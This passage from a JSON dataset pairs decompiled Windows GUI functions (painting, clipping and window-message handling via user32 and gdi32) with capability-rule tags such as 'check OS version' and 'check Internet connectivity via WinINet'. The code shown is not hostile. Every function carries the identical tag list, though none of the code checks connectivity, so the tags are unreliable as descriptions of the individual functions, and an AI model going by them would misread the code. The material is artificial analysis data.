        "decompiled_code": "\nvoid __fastcall fcn.00455b84(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x1b4) == 0) {\n        fcn.00451e68();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.00451abc(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.004241b0();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.00424f30();\n            uVar2 = fcn.004241b0();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.00424f6c();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x497c7c) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x1a8), *(in_EAX + 0x1b4), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.004503a0(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00455cc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455cc0(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    uint uStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    uint *puStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    int32_t hdc;\n    uint nSavedDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    hdc = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (hdc == 0) {\n        puStack100 = &fcn.00455cc0::var_50h;\n        uStack104 = 0x455cea;\n        uStack104 = fcn.00458568();\n        puStack108 = 0x455cf0;\n        hdc = sub.user32.dll_BeginPaint();\n    }\n    puStack112 = 0x455e1f;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x73] == 0) {\n        iStack120 = 0x455d1b;\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xc4))();\n        iStack120 = 0x455df6;\n        fcn.00455e58();\n        *in_FS_OFFSET = iStack116;\n        puStack108 = 0x455e26;\n        if (*(var_8h + 4) == 0) {\n            puStack112 = &fcn.00455cc0::var_50h;\n            iStack116 = 0x455e18;\n            iStack116 = fcn.00458568();\n            iStack120 = 0x455e1e;\n            sub.user32.dll_EndPaint();\n        }\n        return;\n    }\n    iStack120 = hdc;\n    puStack124 = 0x455d29;\n    puStack108 = &stack0xfffffffc;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack128 = 0x455de2;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar4 = 2;\n    iVar3 = *(var_4h[0x73] + 8);\n    puStack124 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack124 = puVar1;\n            iVar2 = fcn.00419888();\n            if ((((*(iVar2 + 0x57) != '\\0') && (((*(iVar2 + 0x1c) & 0x10) == 0 || ((*(iVar2 + 0x55) & 8) == 0)))) ||\n                (((*(iVar2 + 0x1c) & 0x10) != 0 && (((*(iVar2 + 0x55) & 8) == 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) &&\n               ((*(iVar2 + 0x50) & 0x40) != 0)) {\n                iStack132 = hdc;\n                iVar4 = sub.gdi32.dll_ExcludeClipRect();\n                if (iVar4 == 1) break;\n            }\n            iVar3 = iVar3 + -1;\n            puVar1 = puStack124;\n        } while (iVar3 != 0);\n    }\n    if (iVar4 != 1) {\n        (**(*var_4h + 0xc4))();\n    }\n    *in_FS_OFFSET = iStack132;\n    puStack124 = 0x455de9;\n    uStack128 = nSavedDC;\n    iStack132 = hdc;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 942
    },
    "00455e58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455e58(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *arg_8h;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint *puStack76;\n    uint lprc;\n    int32_t var_18h;\n    uint nSavedDC;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hDC;\n    int32_t var_4h;\n    \n    hDC = param_2;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1dc) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x20))();\n    }\n    if (*(var_4h + 0x1cc) != 0) {\n        var_ch = 0;\n        if (param_1 != 0) {\n            var_ch = fcn.004198e4();\n            if (var_ch < 0) {\n                var_ch = 0;\n            }\n        }\n        var_10h = *(*(var_4h + 0x1cc) + 8);\n        if (var_ch < var_10h) {\n            do {\n                var_18h = fcn.00419888();\n                if (((*(var_18h + 0x57) != '\\0') &&\n                    (((*(var_18h + 0x1c) & 0x10) == 0 || ((*(var_18h + 0x55) & 8) == 0)))) ||\n                   (((*(var_18h + 0x1c) & 0x10) != 0 &&\n                    (((*(var_18h + 0x55) & 8) == 0 && ((*(var_18h + 0x51) & 4) == 0)))))) {\n                    fcn.00418438(&fcn.00455e58::lprc, *(var_18h + 0x44) + *(var_18h + 0x4c));\n                    puStack76 = 0x455f75;\n                    iVar1 = sub.gdi32.dll_RectVisible();\n                    if (iVar1 != 0) {\n                        if ((*(var_4h + 0x54) & 0x80) != 0) {\n                            *(var_18h + 0x54) = *(var_18h + 0x54) | 0x80;\n                        }\n                        puStack76 = hDC;\n                        puStack80 = 0x455f98;\n                        nSavedDC = sub.gdi32.dll_SaveDC();\n                        uStack84 = 0x456005;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        puStack80 = &stack0xfffffffc;\n                        fcn.0044ee10();\n                        sub.gdi32.dll_IntersectClipRect(hDC, 0, 0, *(var_18h + 0x48), *(var_18h + 0x4c));\n                        uVar4 = 0;\n                        fcn.00451abc(0);\n                        *in_FS_OFFSET = uVar4;\n                        sub.gdi32.dll_RestoreDC(hDC, nSavedDC, 0x45600c);\n                        return;\n                    }\n                }\n                var_ch = var_ch + 1;\n            } while (var_ch < var_10h);\n        }\n    }\n    if ((*(var_4h + 0x1d0) != 0) && (iVar1 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        var_ch = 0;\n        do {\n            iVar2 = fcn.00419888();\n            if (((*(iVar2 + 0x1d9) != '\\0') && ((*(iVar2 + 0x50) & 0x10) != 0)) &&\n               ((((*(iVar2 + 0x1c) & 0x10) == 0 && (*(iVar2 + 0x57) != '\\0')) ||\n                ((((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)) && ((*(iVar2 + 0x55) & 8) == 0)))))) {\n                fcn.004241b0();\n                uVar4 = sub.gdi32.dll_CreateSolidBrush();\n                puStack76 = 0x4560ce;\n                fcn.00418438(&fcn.00455e58::lprc, *(iVar2 + 0x44) + *(iVar2 + 0x4c));\n                puStack76 = &fcn.00455e58::lprc;\n                puStack80 = hDC;\n                uStack84 = 0x4560db;\n                sub.user32.dll_FrameRect();\n                uStack88 = 0x4560e1;\n                uStack84 = uVar4;\n                sub.gdi32.dll_DeleteObject();\n                uStack88 = 0x4560eb;\n                uStack88 = fcn.004241b0();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush();\n                iVar2 = *(iVar2 + 0x44) + *(iVar2 + 0x4c) + 1;\n                arg_8h = &fcn.00455e58::lprc;\n                uVar4 = uVar3;\n                fcn.00418438(arg_8h, iVar2);\n                sub.user32.dll_FrameRect(hDC, &fcn.00455e58::lprc, arg_8h, iVar2, uVar4);\n                sub.gdi32.dll_DeleteObject(uVar3);\n            }\n            var_ch = var_ch + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 1400
    },
    "004561e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004561e8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t lprc;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint hdc;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    puStack48 = 0x45620a;\n    hdc = in_EDX;\n    var_4h = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack52 = 0x456421;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044ee10();\n    sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n    iVar5 = 0;\n    iVar4 = 0;\n    uVar2 = fcn.00458568(0xffffffec);\n    uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n    if ((uVar3 & 0x200) == 0) {\n        uVar2 = fcn.00458568(0xfffffff0);\n        uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n        if ((uVar3 & 0x800000) != 0) {\n            iVar4 = 3;\n            iVar5 = 0xa00f;\n        }\n    }\n    else {\n        iVar4 = 10;\n        iVar5 = 0x200f;\n    }\n    if (iVar4 == 10) {\n        fcn.00432198();\n        cVar1 = fcn.004322a0();\n        if ((cVar1 != '\\0') && (((*(var_4h + 0x1c) & 0x10) == 0 || (cVar1 = fcn.00432140(),  cVar1 == '\\0')))) {\n            sub.user32.dll_SetRect(&fcn.004561e8::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n            if ((*(var_4h + 0x52) & 2) == 0) {\n                *(var_4h + 0x50) = *(var_4h + 0x50) | *0x45643c;\n                fcn.00456138();\n                *(var_4h + 0x50) = ~*0x45643c & *(var_4h + 0x50);\n            }\n            else {\n                fcn.00456138();\n            }\n            fcn.0044ee10();\n            sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n            goto code_r0x004563a1;\n        }\n    }\n    if (iVar5 != 0) {\n        sub.user32.dll_SetRect(&fcn.004561e8::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n        sub.user32.dll_DrawEdge(hdc, &fcn.004561e8::lprc, iVar4, iVar5);\n        fcn.0044ee10();\n        sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n    }\ncode_r0x004563a1:\n    fcn.00451abc(0);\n    uVar2 = 0;\n    fcn.00451abc(0);\n    if ((*(var_4h + 0x1d0) != 0) && (iVar4 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar4 + -1)) {\n        do {\n            iVar5 = fcn.00419888();\n            if (*(iVar5 + 0x57) != '\\0') {\n                uVar2 = *(iVar5 + 0x44);\n                fcn.004561e8(uVar2);\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x456428);\n    return;\n}\n",
        "token_count": 1117
    },
    "00456804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456804(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.00432198();\n    cVar1 = fcn.004322a0();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x90) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.00424f6c();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else if (*(in_EAX[0xc] + 0x240) == '\\0') {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.00458568();\n        fcn.004323a0(uVar2, arg_ch, arg_10h);\n    }\n    else {\n        fcn.0044d55c();\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 329
    },
    "00456dd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456dd4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00418428();\n    iVar1 = fcn.00451abc(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1e2) != 0)) {\n        (**(in_EAX + 0x1e0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00456e24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456e24(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ea) != 0) {\n        (**(in_EAX + 0x1e8))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00456f54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456f54(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.00458568();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x202) != 0) {\n        (**(in_EAX + 0x200))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00456fb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00456fb0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00456f1c();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.00419888();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 146
    },
    "00457090": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457090(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x457138;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1dc)) && (*(in_EAX + 0x1dc) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.0044e110();\n        if (param_2 == '\\0') {\n            fcn.00404650();\n            *(in_EAX + 0x1ac) = 0;\n            fcn.0040700c();\n        }\n        else {\n            if (*(in_EAX + 0x1ac) == 0) {\n                uVar1 = fcn.00404620();\n                *(in_EAX + 0x1ac) = uVar1;\n            }\n            fcn.0040484c();\n            fcn.00407024();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x45713f;\n    uStack28 = 0x457137;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 346
    },
    "00457148": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457148(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x4c);\n        uStack24 = *(iVar1 + 0x50);\n        uStack20 = *(iVar1 + 0x54);\n        uStack16 = *(iVar1 + 0x58);\n        uStack44 = 2;\n        puStack48 = &fcn.00457148::var_18h;\n        uStack52 = 0x457182;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.00458568();\n        uStack56 = 0;\n        puStack60 = 0x45718a;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x457192;\n        fcn.00454174();\n        uStack64 = 0x45720b;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.0040484c();\n        if ((*(var_4h + 0x1db) != '\\0') && (*(var_4h + 0x1b0) != 0)) {\n            (**(**(var_4h + 0x1b0) + 0x18))(*(*(var_8h + 4) + 0x60));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x457212;\n        uStack64 = 0x45720a;\n        fcn.0045417c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 518
    },
    "00457238": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457238(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1db) != '\\0') && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00457260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457260(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x457275;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x45727f;\n    iVar3 = fcn.00404528();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x4572cb;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040484c();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x4572dc;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x4572ca;\n            fcn.00450a68();\n        }\n        return;\n    }\n    puStack24 = 0x4572dc;\n    fcn.00452d1c();\n    return;\n}\n",
        "token_count": 291
    },
    "00457310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00457310(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    int32_t iStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd00();\n    if ((iVar3 != 0) && (in_EAX != iVar3)) {\n        if (*(iVar3 + 0x275) != '\\0') {\n            cVar1 = fcn.00457310();\n            if (cVar1 != '\\0') goto code_r0x004573ae;\n        }\n        if (*(iVar3 + 0x30) != 0) {\n            iStack20 = fcn.0043bd00();\n            if (((iStack20 != 0) && (iVar3 != iStack20)) && (*(iStack20 + 0x275) != '\\0')) {\n                cVar1 = fcn.00457310();\n                if (cVar1 != '\\0') goto code_r0x004573ae;\n            }\n        }\n    }\n    uVar2 = fcn.0043bbc0();\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040484c(uVar2);\n        if (*(param_2 + 4) == 0) goto code_r0x004573ae;\n    }\n    uVar4 = 0;\ncode_r0x004573ae:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 374
    },
    "0045743c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045743c(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd00();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar1 = fcn.0045743c();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x0045749c;\n    }\n    uVar2 = fcn.0043bbc0();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040484c();\n        if (*(param_2 + 4) == 0) goto code_r0x0045749c;\n    }\n    uVar4 = 0;\ncode_r0x0045749c:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 304
    },
    "00457504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00457504(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd00();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar2 = fcn.00457504();\n        if (cVar2 != '\\0') goto code_r0x00457562;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.0040484c();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x00457562;\n    }\n    uVar4 = 0;\ncode_r0x00457562:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 313
    },
    "0045775c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045775c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x19] == 0) {\n        iVar1 = fcn.00450774();\n        if (iVar1 < 1) {\n            iVar1 = fcn.0040aacc();\n            in_EAX[0x19] = iVar1;\n        }\n        else {\n            iVar1 = fcn.0040aaac();\n            in_EAX[0x19] = iVar1;\n            fcn.0040aac0();\n            fcn.00450784();\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    fcn.004598a0();\n    return;\n}\n",
        "token_count": 168
    },
    "004577dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004577dc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 104
    },
    "00457800": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00457800(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.0044f870();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.00454658();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.0045461c();\n                uVar1 = fcn.0040484c();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 218
    },
    "004578b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004578b4(uint param_1, int32_t param_2)\n\n{\n    fcn.00452ad4();\n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.00454f60();\n    }\n    fcn.004546e8();\n    return;\n}\n",
        "token_count": 90
    },
    "004579cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
